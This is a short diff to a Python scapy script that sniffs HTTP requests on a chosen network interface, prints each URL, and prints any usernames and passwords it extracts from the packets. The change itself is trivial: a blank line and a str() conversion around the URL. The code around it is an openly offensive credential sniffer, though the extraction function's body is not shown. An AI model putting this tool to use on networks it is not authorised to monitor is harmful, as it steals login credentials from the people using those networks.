@@ -2,6 +2,7 @@
 import scapy.all as scapy
 from scapy.layers import http
 import argparse
+
 def get_interface():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-i", "--interface", dest="interface", help="[-] Write interface to sniff")
@@ -26,7 +27,7 @@ def get_information(packet):
 def sniff_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         URLaddress = get_url_address(packet)
-        print("[+] HTTP Request >> " + URLaddress)
+        print("[+] HTTP Request >> " + str(URLaddress))
         login_information = get_information(packet)
         if login_information:
             print("\n\n\n[+] Username/password" + login_information + "\n\n\n")
